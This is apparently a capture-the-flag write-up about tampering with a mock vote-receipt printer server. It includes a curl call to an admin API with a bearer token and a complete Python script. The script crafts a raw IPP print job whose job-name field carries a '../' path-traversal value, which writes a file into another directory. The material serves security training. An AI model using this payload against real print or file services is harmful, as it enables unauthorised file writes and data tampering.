# Who checks the integrity of the integrity checks?
In this challenge, we're told that there was a mismatch in votes and asked if it's possible to tamper with the printed receipts. We're given the source code for a printer server, but no address for where its located. 
### Finding the Server
When attempting to solve this challenge, you should already have the address for the mobile voting app backend, as well as have found the private polling key to allow access to the admin API functions. In those functions there's a `/get-config` endpoint which will return the current config for the polling location that our authentication key was generated for. 
```
dot@stuff:~/Development/CTF/Archive/cysea 2025/week 4$ curl http://mobile-app.commission.freedonia.vote/api/admin/get-config -H "Authorization: Bearer 6e6f747468657265616c746f6b656e"
{"printer":"192.168.1.1"}
```
We now have the IP for the printer server that we can use for the next step.
### Printing the Flag
Looking at the source code for the printer server, our goal is to pass a print job to the server where we use path traversal to print the flag in the challenge target directory rather than the default print job folder. As there's no checks for path traversal this will be fairly straight forward, however we do need to format our payload as an IPP print job, and provide the path as the job name. We can copy the code from the `send_ipp_print_job` function in the mobile backend code, adapting it to our requirements. We then need to fetch the "printed" file from the print server.
```python
import re
import requests
import struct

def send_ipp_print_job(ip, print_path, payload):
    # Attempt to simulate IPP packet
    ipp_request = b""
    ipp_request += struct.pack(">BB", 0x02, 0x00)
    ipp_request += struct.pack(">H", 0x0002)
    ipp_request += struct.pack(">I", 1)
    ipp_request += b"\x01"

    def add_attr(name, value, tag=b"\x42"):
        ipp_request_list = []
        ipp_request_list.append(tag)
        ipp_request_list.append(struct.pack(">H", len(name)))
        ipp_request_list.append(name.encode())
        ipp_request_list.append(struct.pack(">H", len(value)))
        ipp_request_list.append(value.encode())
        return b"".join(ipp_request_list)

    ipp_request += add_attr("attributes-charset", "utf-8", b"\x47")
    ipp_request += add_attr("attributes-natural-language", "en", b"\x48")
    ipp_request += add_attr("printer-uri", f"http://{ip}/printers/votes", b"\x45")
    ipp_request += add_attr("requesting-user-name", "printer")
    ipp_request += add_attr("job-name", print_path)
    ipp_request += b"\x03"
    ipp_request += payload

    url = f"http://{ip}/printers/votes"
    headers = {
        "Content-Type": "application/ipp"
    }

    print(requests.post(url, headers=headers, data=ipp_request, timeout=5))

target_ip = "192.168.1.1"
print_filename = "flag_4d7f9c.txt"
send_ipp_print_job(target_ip, f"../winners/{print_filename}", b"testing")
result = requests.get(f"http://{target_ip}/files/{print_filename}")
print(result.text)
```
Our print job payload is sent, and we then request the resulting file from the server. After running the script the flag should be printed in the console!